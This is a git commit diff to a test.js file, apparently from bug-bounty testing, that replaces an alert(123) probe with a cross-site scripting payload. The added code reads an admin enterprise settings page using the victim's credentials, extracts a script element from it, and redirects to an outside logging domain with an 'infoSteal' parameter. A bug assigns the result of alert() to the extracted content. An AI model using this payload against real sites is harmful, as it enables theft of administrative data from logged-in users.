43126ebd28f9796536a9c9ba237701c1a722f69c
att att <77044381+attacker0258@users.noreply.github.com>
2024-09-06 15:23:45 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,31 @@
-alert(123)
+var req1 = new XMLHttpRequest();
+req1.onload = req1Listener;
+req1.open('get', 'https://hackeronetesting.app.staging.workramp.com/admin/settings/enterprise', true);
+req1.withCredentials = true;
+req1.send();
+
+function req1Listener() {
+    // Create a new DOM parser to parse the response text as HTML
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(this.responseText, 'text/html');
+
+    // Select the first div with the class 'js-redactor-context'
+    var targetDiv = doc.querySelector('.js-redactor-context');
+
+    if (targetDiv) {
+        // Get the first <script> tag within that div
+        var firstScript = targetDiv.querySelector('script');
+        if (firstScript) {
+            // Extract the content of the script
+            var scriptContent = alert(firstScript.outerHTML); // or use textContent if you want the inner script text only
+
+            // Send the script content to a specified URL
+            location = '//its-my-example.domain/log?infoSteal=' + encodeURIComponent(scriptContent);
+        } else {
+            console.log("No script tag found within the target div.");
+        }
+    } else {
+        console.log("No div with class 'js-redactor-context' found.");
+    }
+}
+
